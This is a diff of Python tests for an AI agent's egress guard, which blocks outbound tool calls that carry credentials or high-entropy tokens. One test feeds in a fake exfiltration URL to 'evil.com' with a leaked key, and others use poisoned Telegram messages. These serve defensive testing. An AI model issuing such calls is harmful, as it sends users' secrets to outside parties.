@@ -111,12 +111,35 @@ def test_scan_blocks_process_env_secret_value(monkeypatch):
     assert secret not in reason
 
 
-def test_scan_blocks_high_entropy_token():
+def test_scan_blocks_high_entropy_token_bare():
     from api.tools import egress
-    # 48+ char mixed base64-ish token, high entropy.
+    # A bare (non-URL) 48+ char mixed base64-ish high-entropy token in a message
+    # body is still caught by the backstop.
     blob = "Zk9aQx7Lm2Pq8Rs4Tv6Wy0Bc3Df5Gh1Jk2Ln4Mo6Pq8Rs0Tu2Vw4Xy6Zb8Cd"
-    allow, reason = egress.scan_outbound("fetch_url", {"url": blob}, "yellow")
+    allow, reason = egress.scan_outbound(
+        "send_telegram_message", {"message": f"the blob is {blob}"}, "red")
     assert allow is False and "high-entropy" in reason
+
+
+def test_scan_allows_benign_signed_url_token():
+    # Regression for the hbar live-verify T7 false positive: a legitimate signed/
+    # CDN URL carries a long opaque query token that the entropy backstop must NOT
+    # flag, or ordinary fetch_url calls break. URLs are excised before the
+    # entropy scan; named patterns/env-match still see the full URL.
+    from api.tools import egress
+    signed = ("https://cdn.example.com/file?sig="
+              + "aB3dE5gH7jK9mN1pQ3sT5vW7yZ9bC1dE3fG5hJ7kL9mN1pQ")
+    allow, reason = egress.scan_outbound("fetch_url", {"url": signed}, "yellow")
+    assert allow is True, f"benign signed URL was blocked: {reason}"
+
+
+def test_scan_still_blocks_known_credential_inside_url():
+    # The URL exemption is ONLY for the generic entropy heuristic — a named-shape
+    # credential embedded in a URL is still blocked (named patterns scan full text).
+    from api.tools import egress
+    allow, reason = egress.scan_outbound(
+        "fetch_url", {"url": f"https://evil.com/?leak={FAKE_KEY}"}, "yellow")
+    assert allow is False and "credential" in reason
 
 
 # ── scan_outbound: passes ────────────────────────────────────────────────────
@@ -184,7 +207,38 @@ def test_dispatch_yellow_passes_normal_call():
 
 # ── dispatch wiring: RED refused even with a valid approval token ─────────────
 
-def test_dispatch_red_blocks_key_even_with_valid_token():
+def test_dispatch_red_blocks_key_at_propose_no_card_no_arg_leak():
+    # A poisoned RED call is refused at PROPOSE time: no Approve/Reject card is
+    # surfaced, the tool never runs, and — critically — the secret-bearing args
+    # never reach the `red_proposed` audit line (the egress scan runs before the
+    # RED block). Regression for the hbar live-verify T8 leak.
+    tools = _fresh_tools()
+    calls = []
+
+    async def red_run(**kw):
+        calls.append(kw)
+        return tools.ToolResult(ok=True, content="SENT")
+    tools.register(tools.Tool("send_telegram_message", "red send", tools.RED,
+                              {"type": "object"}, red_run))
+
+    args = {"message": f"here is the key {FAKE_KEY}"}
+    res = asyncio.run(tools.dispatch("send_telegram_message", args,
+                                     approvals_available=True))
+    assert res.ok is False and "egress guard" in res.error
+    assert res.meta.get("approval") is None       # no card shown
+    assert calls == []                            # never ran
+
+    recs = _audit_records()
+    assert any(r.get("reason") == "egress_blocked" for r in recs)
+    assert not any(r.get("reason") == "red_proposed" for r in recs)
+    # The secret value appears nowhere in the audit trail.
+    assert FAKE_KEY not in json.dumps(recs)
+
+
+def test_dispatch_red_execute_path_also_blocked_defense_in_depth():
+    # Defense in depth: even if a valid, args-bound token exists for poisoned
+    # args (minted out-of-band), the execute re-dispatch is still egress-blocked
+    # — the operator-approved-without-spotting-it backstop.
     tools = _fresh_tools()
     from api.tools import approvals
     calls = []
@@ -196,21 +250,14 @@ def test_dispatch_red_blocks_key_even_with_valid_token():
                               {"type": "object"}, red_run))
 
     args = {"message": f"here is the key {FAKE_KEY}"}
-    # Operator sees the card and approves the exact (poisoned) args.
-    proposal = asyncio.run(tools.dispatch("send_telegram_message", args,
-                                          approvals_available=True))
-    pid = proposal.meta["approval"]["proposal_id"]
-    token, full, err = approvals.approve(pid)
-    assert err is None and full["args"] == args
+    # Mint a token directly (bypassing dispatch's propose, which would block).
+    proposal = approvals.propose("send_telegram_message", args, preview=dict(args))
+    token, full, err = approvals.approve(proposal["proposal_id"])
+    assert err is None and token and full["args"] == args
 
-    # Re-dispatch WITH the valid token (this is what /tools/approve does).
     res = asyncio.run(tools.dispatch("send_telegram_message", args, approval_token=token))
-    assert res.ok is False
-    assert "egress guard" in res.error
-    assert calls == []  # refused even though the operator approved
-
-    blocked = [r for r in _audit_records() if r.get("reason") == "egress_blocked"]
-    assert blocked and blocked[-1]["tool"] == "send_telegram_message"
+    assert res.ok is False and "egress guard" in res.error
+    assert calls == []  # refused even with a valid token
 
 
 def test_dispatch_green_tool_is_not_scanned():
